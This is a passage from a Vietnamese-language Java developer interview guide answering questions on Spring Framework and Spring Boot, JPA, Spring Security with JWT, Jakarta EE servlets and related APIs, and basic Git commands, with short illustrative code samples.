```

**Best practice:** Config phức tạp nên ưu tiên `@ConfigurationProperties` + `@Validated`; chỉ dùng `@Value` cho giá trị nhỏ, rời rạc.

---

# PHẦN 2: SPRING FRAMEWORK & SPRING BOOT

---

## 2.1. Spring Core

### Q27: IoC (Inversion of Control) và DI (Dependency Injection)?

**IoC:** Đảo ngược quyền kiểm soát — thay vì object tự tạo dependency, Spring Container quản lý và inject vào.

**DI:** Cách triển khai IoC. Spring tự động inject dependency qua:

```java
// 1. Constructor Injection (khuyên dùng nhất)
@Service
public class OrderService {
    private final PaymentService paymentService;
    private final NotificationService notificationService;
    
    @Autowired // có thể bỏ nếu chỉ 1 constructor
    public OrderService(PaymentService paymentService,
                        NotificationService notificationService) {
        this.paymentService = paymentService;
        this.notificationService = notificationService;
    }
}

// 2. Setter Injection
@Service
public class OrderService {
    private PaymentService paymentService;
    
    @Autowired
    public void setPaymentService(PaymentService paymentService) {
        this.paymentService = paymentService;
    }
}

// 3. Field Injection (tránh dùng - khó test)
@Service
public class OrderService {
    @Autowired
    private PaymentService paymentService;
}
```

**Tại sao Constructor Injection tốt nhất?**
- Đảm bảo immutability (final fields).
- Dễ viết unit test (truyền mock qua constructor).
- Fail-fast: lỗi thiếu dependency ngay lúc khởi tạo.

---

### Q28: Bean Scopes trong Spring?

| Scope | Mô tả | Khi nào dùng |
|-------|--------|-------------|
| `singleton` (default) | 1 instance cho toàn bộ container | Service, Repository, Config |
| `prototype` | Instance mới mỗi lần request | Stateful bean, command objects |
| `request` | 1 instance per HTTP request | Web: request-specific data |
| `session` | 1 instance per HTTP session | Web: user session data |
| `application` | 1 instance per ServletContext | Web: app-wide shared data |

```java
@Component
@Scope("prototype")
public class ShoppingCart {
    private List<Item> items = new ArrayList<>();
}

// Hoặc dùng annotation
@RequestScope
@SessionScope
```

---

### Q29: Bean Lifecycle?

```
1. Container khởi tạo
2. Bean Definition đọc từ config
3. Bean Instantiation (constructor)
4. Dependency Injection
5. @PostConstruct / InitializingBean.afterPropertiesSet()
6. Custom init-method
7. ─── Bean sẵn sàng sử dụng ───
8. @PreDestroy / DisposableBean.destroy()
9. Custom destroy-method
10. Container shutdown
```

```java
@Component
public class DatabaseConnection {
    
    @PostConstruct
    public void init() {
        System.out.println("Khởi tạo connection pool...");
    }
    
    @PreDestroy
    public void cleanup() {
        System.out.println("Đóng connection pool...");
    }
}
```

---

### Q30: @Component vs @Service vs @Repository vs @Controller?

Tất cả đều là Spring Beans, nhưng mang ý nghĩa ngữ cảnh khác nhau:

| Annotation | Layer | Chức năng đặc biệt |
|-----------|-------|-------------------|
| `@Component` | General | Bean chung, không thuộc layer cụ thể |
| `@Service` | Business Logic | Đánh dấu service layer, không có xử lý đặc biệt |
| `@Repository` | Data Access | Tự động translate persistence exceptions |
| `@Controller` | Presentation | Xử lý HTTP request, trả về view |
| `@RestController` | REST API | = @Controller + @ResponseBody |

```java
@RestController
@RequestMapping("/api/users")
public class UserController {
    private final UserService userService;
    // ...
}

@Service
public class UserService {
    private final UserRepository userRepository;
    // ...
}

@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    // Spring Data tự generate implementation
}
```

---

### Q31: @Autowired hoạt động thế nào? Giải quyết conflict khi có nhiều bean cùng type?

Spring tìm bean phù hợp theo type. Khi có nhiều bean cùng type:

```java
public interface NotificationService { void send(String msg); }

@Service
public class EmailNotification implements NotificationService { ... }

@Service  
public class SmsNotification implements NotificationService { ... }

// Cách 1: @Primary
@Primary
@Service
public class EmailNotification implements NotificationService { ... }

// Cách 2: @Qualifier
@Service
public class OrderService {
    @Autowired
    @Qualifier("smsNotification")
    private NotificationService notificationService;
}

// Cách 3: Inject List tất cả implementations
@Autowired
private List<NotificationService> allNotifiers;
```

---

## 2.2. Spring Boot

### Q32: Spring Boot khác gì Spring Framework?

Spring Boot là opinionated framework xây dựng trên Spring Framework, cung cấp:

- **Auto-configuration:** Tự động cấu hình dựa trên dependencies có trong classpath.
- **Starter dependencies:** Gom nhóm dependencies liên quan (spring-boot-starter-web, spring-boot-starter-data-jpa...).
- **Embedded server:** Tomcat/Jetty/Undertow tích hợp sẵn, không cần deploy WAR.
- **Actuator:** Monitoring và health check endpoints.
- **Không cần XML config:** Dùng annotation và application.properties/yml.

---

### Q33: Spring Boot Auto-Configuration hoạt động thế nào?

```
1. @SpringBootApplication
   = @Configuration + @EnableAutoConfiguration + @ComponentScan

2. @EnableAutoConfiguration kích hoạt:
   - Đọc META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports
   - Load các @Configuration classes tương ứng

3. Mỗi auto-config class dùng @Conditional:
   - @ConditionalOnClass: chỉ apply nếu class tồn tại trên classpath
   - @ConditionalOnMissingBean: chỉ apply nếu user chưa tự define bean
   - @ConditionalOnProperty: chỉ apply nếu property được set

Ví dụ: Nếu có HikariCP trên classpath → auto-config DataSource
        Nếu user đã define DataSource → auto-config bỏ qua
```

---

### Q34: application.properties vs application.yml? Profiles?

```properties
# application.properties
server.port=8080
spring.datasource.url=jdbc:mysql://localhost:3306/mydb
spring.datasource.username=root
spring.jpa.hibernate.ddl-auto=update
```

```yaml
# application.yml
server:
  port: 8080
spring:
  datasource:
    url: jdbc:mysql://localhost:3306/mydb
    username: root
  jpa:
    hibernate:
      ddl-auto: update
```

**Profiles:** Quản lý config theo môi trường.

```yaml
# application-dev.yml
spring:
  datasource:
    url: jdbc:h2:mem:testdb

# application-prod.yml
spring:
  datasource:
    url: jdbc:mysql://prod-server:3306/mydb
```

```bash
# Kích hoạt profile
java -jar app.jar --spring.profiles.active=prod

# Hoặc trong application.yml
spring.profiles.active: dev
```

---

### Q35: Spring Boot Actuator dùng để làm gì?

Cung cấp production-ready features: health check, metrics, environment info.

```yaml
management:
  endpoints:
    web:
      exposure:
        include: health,info,metrics,env
  endpoint:
    health:
      show-details: always
```

Endpoints chính:
- `/actuator/health` — trạng thái ứng dụng (UP/DOWN).
- `/actuator/info` — thông tin ứng dụng.
- `/actuator/metrics` — JVM, HTTP, custom metrics.
- `/actuator/env` — environment properties.
- `/actuator/beans` — danh sách tất cả beans.

---

## 2.3. Spring MVC & REST API

### Q36: Request lifecycle trong Spring MVC?

```
Client Request
     │
     ▼
DispatcherServlet (Front Controller)
     │
     ▼
HandlerMapping (tìm Controller phù hợp)
     │
     ▼
HandlerAdapter → Controller Method
     │
     ▼
Service Layer → Repository Layer → Database
     │
     ▼
Response (JSON/View)
     │
     ▼
DispatcherServlet → Client
```

---

### Q37: Các annotation quan trọng trong REST Controller?

```java
@RestController
@RequestMapping("/api/v1/products")
public class ProductController {

    @GetMapping                          // GET /api/v1/products
    public List<Product> getAll() { }

    @GetMapping("/{id}")                 // GET /api/v1/products/1
    public Product getById(@PathVariable Long id) { }

    @GetMapping("/search")               // GET /api/v1/products/search?name=phone
    public List<Product> search(@RequestParam String name) { }

    @PostMapping                         // POST /api/v1/products
    public Product create(@RequestBody @Valid ProductDTO dto) { }

    @PutMapping("/{id}")                 // PUT /api/v1/products/1
    public Product update(@PathVariable Long id, @RequestBody ProductDTO dto) { }

    @PatchMapping("/{id}")               // PATCH /api/v1/products/1
    public Product partialUpdate(@PathVariable Long id, @RequestBody Map<String, Object> updates) { }

    @DeleteMapping("/{id}")              // DELETE /api/v1/products/1
    public void delete(@PathVariable Long id) { }
}
```

Các annotation tham số:
- `@PathVariable`: lấy giá trị từ URL path.
- `@RequestParam`: lấy query parameter.
- `@RequestBody`: parse JSON body thành object.
- `@RequestHeader`: lấy HTTP header.
- `@CookieValue`: lấy cookie.

---

### Q38: Exception Handling trong Spring?

```java
// Cách 1: @ControllerAdvice (Global Exception Handler) — khuyên dùng
@RestControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(ResourceNotFoundException.class)
    @ResponseStatus(HttpStatus.NOT_FOUND)
    public ErrorResponse handleNotFound(ResourceNotFoundException ex) {
        return new ErrorResponse(404, ex.getMessage());
    }

    @ExceptionHandler(MethodArgumentNotValidException.class)
    @ResponseStatus(HttpStatus.BAD_REQUEST)
    public ErrorResponse handleValidation(MethodArgumentNotValidException ex) {
        Map<String, String> errors = new HashMap<>();
        ex.getBindingResult().getFieldErrors()
            .forEach(e -> errors.put(e.getField(), e.getDefaultMessage()));
        return new ErrorResponse(400, "Validation failed", errors);
    }

    @ExceptionHandler(Exception.class)
    @ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR)
    public ErrorResponse handleGeneral(Exception ex) {
        return new ErrorResponse(500, "Internal Server Error");
    }
}

// Custom Exception
public class ResourceNotFoundException extends RuntimeException {
    public ResourceNotFoundException(String message) { super(message); }
}

// Error Response DTO
public record ErrorResponse(int status, String message, Object details) {
    public ErrorResponse(int status, String message) {
        this(status, message, null);
    }
}
```

---

### Q39: Validation trong Spring?

```java
public class CreateUserDTO {
    @NotBlank(message = "Name is required")
    @Size(min = 2, max = 50, message = "Name must be 2-50 characters")
    private String name;

    @Email(message = "Invalid email format")
    @NotNull
    private String email;

    @Min(value = 18, message = "Must be at least 18")
    @Max(value = 150)
    private int age;

    @Pattern(regexp = "^\\+?[0-9]{10,15}$", message = "Invalid phone number")
    private String phone;

    @NotNull
    @Past(message = "Birth date must be in the past")
    private LocalDate birthDate;
}

// Custom Validator
@Target({FIELD})
@Retention(RUNTIME)
@Constraint(validatedBy = UniqueEmailValidator.class)
public @interface UniqueEmail {
    String message() default "Email already exists";
    Class<?>[] groups() default {};
    Class<? extends Payload>[] payload() default {};
}

public class UniqueEmailValidator implements ConstraintValidator<UniqueEmail, String> {
    @Autowired private UserRepository userRepository;
    
    @Override
    public boolean isValid(String email, ConstraintValidatorContext context) {
        return !userRepository.existsByEmail(email);
    }
}
```

---

## 2.4. Spring Data JPA

### Q40: JPA và Hibernate là gì? Quan hệ giữa chúng?

- **JPA (Jakarta Persistence API):** Specification (chỉ là bộ interface/annotation) cho ORM trong Java.
- **Hibernate:** Implementation phổ biến nhất của JPA.
- **Spring Data JPA:** Abstraction layer trên JPA, cung cấp repository pattern với ít boilerplate code.

```
Spring Data JPA → JPA (spec) → Hibernate (impl) → JDBC → Database
```

---

### Q41: Entity mapping và relationships?

```java
@Entity
@Table(name = "employees")
public class Employee {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(name = "full_name", nullable = false, length = 100)
    private String name;

    @Enumerated(EnumType.STRING)
    private Status status;

    @CreationTimestamp
    private LocalDateTime createdAt;

    // Many-to-One
    @ManyToOne(fetch = FetchType.LAZY)
    @JoinColumn(name = "department_id")
    private Department department;

    // One-to-Many
    @OneToMany(mappedBy = "employee", cascade = CascadeType.ALL, orphanRemoval = true)
    private List<Task> tasks = new ArrayList<>();

    // Many-to-Many
    @ManyToMany
    @JoinTable(
        name = "employee_project",
        joinColumns = @JoinColumn(name = "employee_id"),
        inverseJoinColumns = @JoinColumn(name = "project_id")
    )
    private Set<Project> projects = new HashSet<>();
    
    // One-to-One
    @OneToOne(cascade = CascadeType.ALL)
    @JoinColumn(name = "address_id")
    private Address address;
}
```

---

### Q42: FetchType.LAZY vs FetchType.EAGER? N+1 Problem?

**LAZY:** Chỉ load khi access. Default cho `@OneToMany`, `@ManyToMany`.
**EAGER:** Load ngay cùng entity cha. Default cho `@ManyToOne`, `@OneToOne`.

**N+1 Problem:** Khi query N entities, mỗi entity trigger thêm 1 query để load relationship → tổng N+1 queries.

```java
// N+1 Problem
List<Department> depts = deptRepo.findAll(); // 1 query
for (Department d : depts) {
    d.getEmployees().size(); // N queries thêm!
}

// Giải pháp 1: JOIN FETCH (JPQL)
@Query("SELECT d FROM Department d JOIN FETCH d.employees")
List<Department> findAllWithEmployees();

// Giải pháp 2: @EntityGraph
@EntityGraph(attributePaths = {"employees"})
List<Department> findAll();

// Giải pháp 3: @BatchSize
@OneToMany(mappedBy = "department")
@BatchSize(size = 20)
private List<Employee> employees;
```

---

### Q43: Spring Data JPA Repository methods?

```java
public interface UserRepository extends JpaRepository<User, Long> {

    // Derived Query Methods (Spring tự generate SQL)
    List<User> findByName(String name);
    List<User> findByNameContainingIgnoreCase(String keyword);
    List<User> findByAgeBetween(int min, int max);
    List<User> findByDepartmentNameOrderByNameAsc(String deptName);
    Optional<User> findByEmail(String email);
    boolean existsByEmail(String email);
    long countByStatus(Status status);

    // Custom JPQL
    @Query("SELECT u FROM User u WHERE u.salary > :minSalary AND u.department.name = :dept")
    List<User> findHighEarners(@Param("minSalary") double minSalary, @Param("dept") String dept);

    // Native SQL
    @Query(value = "SELECT * FROM users WHERE created_at > :date", nativeQuery = true)
    List<User> findRecentUsers(@Param("date") LocalDate date);

    // Modifying
    @Modifying
    @Transactional
    @Query("UPDATE User u SET u.status = :status WHERE u.lastLogin < :date")
    int deactivateInactiveUsers(@Param("status") Status status, @Param("date") LocalDate date);
    
    // Pagination & Sorting
    Page<User> findByStatus(Status status, Pageable pageable);
}

// Usage
Page<User> page = userRepo.findByStatus(Status.ACTIVE,
    PageRequest.of(0, 10, Sort.by("name").ascending()));
```

---

### Q44: @Transactional hoạt động thế nào?

```java
@Service
public class TransferService {

    @Transactional  // mặc định: propagation=REQUIRED, isolation=DEFAULT
    public void transfer(Long fromId, Long toId, double amount) {
        Account from = accountRepo.findById(fromId).orElseThrow();
        Account to = accountRepo.findById(toId).orElseThrow();
        
        from.withdraw(amount);   // nếu exception ở đây
        to.deposit(amount);      // → cả 2 đều rollback
        
        accountRepo.save(from);
        accountRepo.save(to);
    }
}

// Propagation levels phổ biến:
// REQUIRED (default): join transaction hiện tại hoặc tạo mới
// REQUIRES_NEW: luôn tạo transaction mới, suspend cũ
// MANDATORY: phải có transaction sẵn, nếu không → exception
// NOT_SUPPORTED: chạy không transaction
// NESTED: tạo savepoint trong transaction hiện tại

// Isolation levels:
// READ_UNCOMMITTED: đọc data chưa commit (dirty read)
// READ_COMMITTED: chỉ đọc data đã commit
// REPEATABLE_READ: đảm bảo đọc lại cùng giá trị
// SERIALIZABLE: cao nhất, chậm nhất

// Chỉ rollback cho unchecked exception mặc định
@Transactional(rollbackFor = Exception.class) // rollback cả checked exception
```

**Lưu ý quan trọng:** `@Transactional` dùng AOP proxy, nên KHÔNG hoạt động khi:
- Gọi method trong cùng class (self-invocation).
- Method là `private`.
- Gọi từ non-Spring managed object.

---

## 2.5. Spring Security Basics

### Q45: Spring Security cơ bản?

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())  // disable CSRF cho REST API
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/**").authenticated()
            )
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
        return http.build();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

**Authentication vs Authorization:**
- **Authentication:** Xác thực "bạn là ai" (login).
- **Authorization:** Phân quyền "bạn được làm gì" (role/permission).

---

### Q46: JWT Authentication flow?

```
1. Client POST /auth/login {username, password}
2. Server xác thực credentials
3. Server tạo JWT token (header.payload.signature)
4. Client nhận token, lưu (localStorage/cookie)
5. Client gửi request với header: Authorization: Bearer <token>
6. Server validate token qua JwtAuthFilter
7. Nếu hợp lệ → set Authentication vào SecurityContext
8. Request tiếp tục đến Controller
```

```java
// JWT Token structure
// Header: {"alg": "HS256", "typ": "JWT"}
// Payload: {"sub": "user@email.com", "roles": ["USER"], "exp": 1234567890}
// Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)

@Component
public class JwtUtil {
    @Value("${jwt.secret}") private String secret;
    
    public String generateToken(UserDetails userDetails) {
        return Jwts.builder()
            .setSubject(userDetails.getUsername())
            .claim("roles", userDetails.getAuthorities())
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + 86400000)) // 24h
            .signWith(Keys.hmacShaKeyFor(secret.getBytes()), SignatureAlgorithm.HS256)
            .compact();
    }
    
    public boolean validateToken(String token, UserDetails userDetails) {
        String username = extractUsername(token);
        return username.equals(userDetails.getUsername()) && !isTokenExpired(token);
    }
}
```

---

# PHẦN 3: J2EE (Jakarta EE) TECHNOLOGIES

---

### Q47: Servlet là gì? Lifecycle?

Servlet là Java class xử lý HTTP request/response trên server.

```
Lifecycle:
1. Container load Servlet class
2. init() — khởi tạo 1 lần
3. service() → doGet()/doPost()/... — xử lý mỗi request
4. destroy() — dọn dẹp khi shutdown
```

```java
@WebServlet("/hello")
public class HelloServlet extends HttpServlet {
    
    @Override
    public void init() throws ServletException {
        // Khởi tạo resources
    }
    
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) 
            throws ServletException, IOException {
        String name = req.getParameter("name");
        resp.setContentType("application/json");
        resp.getWriter().write("{\"message\": \"Hello " + name + "\"}");
    }
    
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) 
            throws ServletException, IOException {
        // Handle POST
    }
    
    @Override
    public void destroy() {
        // Cleanup resources
    }
}
```

---

### Q48: Servlet Filter vs Spring Interceptor?

| | Servlet Filter | Spring Interceptor |
|--|---|---|
| Thuộc | Servlet spec (J2EE) | Spring MVC |
| Áp dụng | Mọi request (kể cả static) | Chỉ request đến Controller |
| Interface | `javax.servlet.Filter` | `HandlerInterceptor` |
| Lifecycle | `init`, `doFilter`, `destroy` | `preHandle`, `postHandle`, `afterCompletion` |
| Dùng khi | Logging, CORS, encoding, security | Auth, audit, locale, timing |

```java
// Servlet Filter
@Component
@Order(1)
public class LoggingFilter implements Filter {
    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) 
            throws IOException, ServletException {
        long start = System.currentTimeMillis();
        chain.doFilter(req, resp);
        long duration = System.currentTimeMillis() - start;
        log.info("Request took {} ms", duration);
    }
}

// Spring Interceptor
@Component
public class AuthInterceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, 
            Object handler) {
        String token = request.getHeader("Authorization");
        if (token == null) {
            response.setStatus(401);
            return false;  // chặn request
        }
        return true;  // cho phép tiếp tục
    }
}
```

---

### Q49: JSP, JSTL, EL là gì?

- **JSP (JavaServer Pages):** Template engine cho phép embed Java code trong HTML. Được compile thành Servlet.
- **EL (Expression Language):** `${expression}` — truy cập data trong JSP không cần Java code.
- **JSTL (JSP Standard Tag Library):** Thư viện tag chuẩn (loop, condition, format).

```jsp
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>

<h1>Hello ${user.name}</h1>  <!-- EL -->

<c:forEach var="item" items="${products}">  <!-- JSTL -->
    <p>${item.name} - $${item.price}</p>
</c:forEach>

<c:if test="${user.role == 'ADMIN'}">
    <a href="/admin">Admin Panel</a>
</c:if>
```

*Lưu ý: Hiện nay JSP ít dùng, thay thế bằng Thymeleaf (server-side) hoặc React/Angular/Vue (client-side).*

---

### Q50: Session & Cookie?

| | Session | Cookie |
|--|---------|--------|
| Lưu ở | Server | Client (browser) |
| Dung lượng | Không giới hạn | ~4KB |
| Bảo mật | Tốt hơn | Dễ bị đánh cắp |
| Hết hạn | Khi timeout hoặc invalidate | Có thể set expiry |
| Dùng cho | Auth state, shopping cart | Remember me, preferences |

```java
// Session
HttpSession session = request.getSession();
session.setAttribute("user", currentUser);
session.setMaxInactiveInterval(1800); // 30 phút

User user = (User) session.getAttribute("user");
session.invalidate(); // logout

// Cookie
Cookie cookie = new Cookie("lang", "vi");
cookie.setMaxAge(7 * 24 * 3600); // 7 ngày
cookie.setHttpOnly(true);  // bảo mật: JS không truy cập được
cookie.setSecure(true);    // chỉ gửi qua HTTPS
response.addCookie(cookie);
```

---

### Q51: JDBC là gì? Connection Pooling?

**JDBC (Java Database Connectivity):** API chuẩn để kết nối Java với database.

```java
// JDBC cơ bản
try (Connection conn = DriverManager.getConnection(url, user, pass);
     PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?")) {
    ps.setLong(1, userId);
    ResultSet rs = ps.executeQuery();
    while (rs.next()) {
        String name = rs.getString("name");
    }
}
```

**Connection Pooling:** Tạo sẵn pool connections, tái sử dụng thay vì tạo mới mỗi lần → giảm overhead.

```yaml
# HikariCP (default trong Spring Boot, nhanh nhất)
spring:
  datasource:
    hikari:
      maximum-pool-size: 20
      minimum-idle: 5
      idle-timeout: 300000
      connection-timeout: 20000
      max-lifetime: 1200000
```

---

### Q52: JMS (Java Message Service)?

JMS là API chuẩn cho messaging giữa các ứng dụng Java.

**Hai mô hình:**
- **Point-to-Point (Queue):** Một message cho một consumer.
- **Publish/Subscribe (Topic):** Một message cho nhiều subscribers.

```java
// Producer (gửi)
@Service
public class OrderProducer {
    @Autowired private JmsTemplate jmsTemplate;
    
    public void sendOrder(Order order) {
        jmsTemplate.convertAndSend("order-queue", order);
    }
}

// Consumer (nhận)
@Component
public class OrderConsumer {
    @JmsListener(destination = "order-queue")
    public void processOrder(Order order) {
        // Xử lý order
    }
}
```

---

### Q188: WAR vs JAR khác gì? Khi nào dùng cái nào?

**Trả lời:**

| Tiêu chí | JAR | WAR |
|---|---|---|
| Mục tiêu | Đóng gói Java app/library | Đóng gói web app theo Servlet spec |
| Chạy kiểu hiện đại | `java -jar app.jar` (Spring Boot embedded) | Deploy lên server ngoài (Tomcat/JBoss) |
| Cấu trúc | `META-INF`, class/resources | `WEB-INF`, `WEB-INF/lib`, `WEB-INF/classes`, web resources |
| Use case | Microservice, app độc lập | Hệ thống cũ dùng app server tập trung |

```text
sample.war
 ├── index.jsp
 ├── css/
 └── WEB-INF/
     ├── web.xml
     ├── classes/   (compiled classes)
     └── lib/       (dependencies)
```

**Khi dùng:**
- Dùng **JAR** cho Spring Boot 3.x đa số dự án mới.
- Dùng **WAR** khi tổ chức yêu cầu deploy vào server/container sẵn có.

---

### Q189: Servlet Container là gì? So sánh Tomcat, Jetty, Undertow

**Trả lời:**

Servlet Container là runtime thực thi Servlet/JSP, quản lý request lifecycle, session, thread pool.

| Container | Điểm mạnh | Khi dùng |
|---|---|---|
| Tomcat | Phổ biến nhất, tài liệu nhiều, ổn định | Mặc định tốt cho đa số Spring Boot app |
| Jetty | Nhẹ, startup nhanh, nhúng tốt | Embedded service, footprint nhỏ |
| Undertow | Non-blocking tốt, throughput cao | API traffic lớn, cần hiệu năng I/O |

⚠️ Performance thực tế phụ thuộc cấu hình, payload, DB/network bottleneck — không chỉ do container.

---

### Q190: EJB là gì? Stateless/Stateful/Singleton/MDB? Còn dùng dự án mới không?

**Trả lời:**

EJB (Enterprise JavaBeans) là component model của Jakarta EE cho transaction, security, remoting.

| Loại EJB | Đặc điểm | Use case |
|---|---|---|
| Stateless | Không giữ state theo client | Service xử lý request độc lập |
| Stateful | Giữ state theo session client | Workflow nhiều bước theo user |
| Singleton | Một instance toàn app | Shared config/cache nhỏ |
| Message-Driven Bean | Consume message async | Xử lý queue/topic bất đồng bộ |

**Hiện trạng:** dự án mới dùng EJB ít hơn; Spring Boot phổ biến hơn vì nhẹ, dễ setup, ecosystem mạnh, cloud-native tốt.

---

### Q191: ServletContext vs ServletConfig vs HttpSession

**Trả lời:**

| Thành phần | Scope | Vòng đời | Use case |
|---|---|---|---|
| ServletContext | Toàn ứng dụng | Từ startup đến shutdown | App-level config, shared object |
| ServletConfig | Một servlet cụ thể | Theo servlet instance | Init params riêng servlet |
| HttpSession | Một user session | Tạo khi login/request cần session | Lưu trạng thái người dùng |

```java
// ServletContext: shared toàn app
ServletContext ctx = request.getServletContext();
ctx.setAttribute("appVersion", "1.0.0");

// HttpSession: theo user
HttpSession session = request.getSession();
session.setAttribute("userId", 1001L);
```

---

### Q192: `@WebServlet`, `@WebFilter`, `@WebListener` vs `web.xml`

**Trả lời:**

| Cách đăng ký | Ưu điểm | Nhược điểm |
|---|---|---|
| Annotation (`@WebServlet`...) | Gọn, gần code, dễ đọc | Khó tập trung khi hệ lớn |
| `web.xml` | Cấu hình tập trung, dễ audit | Verbose, bảo trì lâu dài khó hơn |

```java
import jakarta.servlet.annotation.WebFilter;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;

@WebServlet(urlPatterns = "/health")
public class HealthServlet extends HttpServlet {}

@WebFilter(urlPatterns = "/*")
public class TraceFilter implements jakarta.servlet.Filter {}
```

Trong Spring Boot, thường ưu tiên annotation hoặc đăng ký bằng bean config thay vì `web.xml`.

---

### Q193: Vì sao Spring Boot dùng embedded server thay WAR truyền thống?

**Trả lời:**

| Tiêu chí | Embedded (JAR) | WAR + app server ngoài |
|---|---|---|
| Deploy | Đơn giản, self-contained | Cần server runtime riêng |
| Môi trường | Nhất quán dev/test/prod | Dễ lệch cấu hình giữa môi trường |
| Cloud/CI-CD | Rất phù hợp container | Thiết lập phức tạp hơn |
| Vận hành tập trung | Kém hơn model app server chung | Mạnh khi tổ chức chuẩn hóa server |

**Ưu điểm embedded:** đóng gói 1 artifact, startup nhanh, dễ scale theo service.  
**Nhược điểm:** mỗi app mang theo server runtime riêng, có thể tăng memory tổng thể.

---

### Q194: CDI trong Jakarta EE khác Spring DI thế nào?

**Trả lời:**

| Tiêu chí | CDI (Jakarta EE) | Spring DI |
|---|---|---|
| Chuẩn | Chuẩn Jakarta (`jakarta.inject`) | Framework Spring |
| Annotation chính | `@Inject`, `@Named`, qualifiers | `@Autowired`, `@Qualifier`, stereotypes |
| Ecosystem | Gắn Jakarta EE stack | Rất rộng trong Spring ecosystem |
| Triết lý | Chuẩn hóa container EE | Tính thực dụng, nhiều auto-config |

```java
// CDI style
import jakarta.inject.Inject;

public class PaymentService {
    @Inject
    private PaymentGateway gateway;
}
```

Spring DI linh hoạt hơn trong dự án Spring Boot hiện đại; CDI phù hợp stack Jakarta EE thuần.

---

### Q195: JTA là gì? Khác `@Transactional` của Spring thế nào?

**Trả lời:**

JTA (Java Transaction API) là chuẩn transaction, hỗ trợ distributed transaction/XA qua nhiều resource.

| Tiêu chí | JTA | Spring `@Transactional` |
|---|---|---|
| Bản chất | Chuẩn API transaction | Abstraction transaction của Spring |
| Phạm vi | Mạnh ở distributed/XA | Rất tiện cho local transaction (JPA/JDBC) |
| Cấu hình | Phức tạp hơn | Dễ dùng hơn trong app Spring |

⚠️ Distributed XA transaction có chi phí cao; đa số microservice ưu tiên saga/outbox thay vì XA toàn cục.

---

### Q196: Bean Validation: `@NotNull`, `@NotBlank`, `@NotEmpty`; `@Valid` vs `@Validated`

**Trả lời:**

| Annotation | Áp dụng | Ý nghĩa |
|---|---|---|
| `@NotNull` | Object/string/collection | Không được `null` |
| `@NotEmpty` | String/collection/map/array | Không `null` và size > 0 |
| `@NotBlank` | String | Không `null`, trim xong còn ký tự |

| `@Valid` | `@Validated` |
|---|---|
| Chuẩn Bean Validation, cascade validation object graph | Spring annotation, hỗ trợ validate theo group |

```java
import jakarta.validation.Valid;
import jakarta.validation.constraints.NotBlank;
import jakarta.validation.constraints.NotNull;
import jakarta.validation.constraints.Size;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.*;

record CreateUserRequest(
        @NotBlank String name,
        @NotNull @Size(min = 8) String password
) {}

@RestController
@Validated
class UserController {
    @PostMapping("/api/users")
    public String create(@RequestBody @Valid CreateUserRequest req) {
        return "ok";
    }
}
```

---

# PHẦN 4: GIT

---

### Q53: Các lệnh Git cơ bản?

```bash
# Khởi tạo & Clone
git init                          # tạo repo mới
git clone <url>                   # clone repo

# Staging & Commit
git status                        # xem trạng thái
git add <file>                    # stage file
git add .                         # stage tất cả
git commit -m "message"           # commit
git commit --amend                # sửa commit cuối

# Branching
git branch                        # list branches
git branch feature/login          # tạo branch mới
git checkout feature/login        # chuyển branch
git checkout -b feature/login     # tạo & chuyển
git switch feature/login          # (Git 2.23+) chuyển branch

# Merge & Rebase
git merge feature/login           # merge vào branch hiện tại
git rebase main                   # rebase lên main

# Remote
git remote add origin <url>       # thêm remote
git push origin main              # push
git pull origin main              # pull (fetch + merge)
git fetch origin                  # fetch (chỉ download, không merge)

# Xem lịch sử
git log --oneline --graph         # lịch sử đẹp
git diff                          # xem thay đổi
git blame <file>                  # ai sửa dòng nào

# Undo
git reset --soft HEAD~1           # undo commit, giữ changes staged
git reset --mixed HEAD~1          # undo commit, giữ changes unstaged
git reset --hard HEAD~1           # undo commit, XÓA changes
git revert <commit>               # tạo commit đảo ngược

# Stash
git stash                         # cất tạm changes
git stash pop                     # lấy lại changes
git stash list                    # list stash
```

---

### Q54: Git Merge vs Rebase?

**Merge:** Tạo merge commit, giữ nguyên lịch sử.
```
main:    A─B─C───────M (merge commit)
              ╲      ╱
feature:       D─E─F
```

**Rebase:** Di chuyển commits lên đầu branch target, lịch sử linear.
```
Trước rebase:
main:    A─B─C
              ╲
feature:       D─E─F

Sau rebase:
main:    A─B─C
                  ╲
feature:           D'─E'─F'
```

**Khi nào dùng:**
- **Merge:** cho shared branches (main, develop), bảo toàn lịch sử.
- **Rebase:** cho feature branch cá nhân, lịch sử sạch sẽ.
- **Quy tắc vàng:** KHÔNG BAO GIỜ rebase branch đã push và có người khác đang dùng.

---

### Q55: Git Flow là gì?

```
main (production)
  │
  ├── hotfix/urgent-fix     ← fix bug production
  │
develop (development)
  │
  ├── feature/login         ← tính năng mới
  ├── feature/payment
  │
  ├── release/v1.0          ← chuẩn bị release
  │
```

- **main:** code production, luôn stable.
- **develop:** tích hợp features, base cho feature branches.
- **feature/*:** phát triển tính năng, tách từ develop, merge về develop.
- **release/*:** chuẩn bị release, fix bug nhỏ, merge về main và develop.
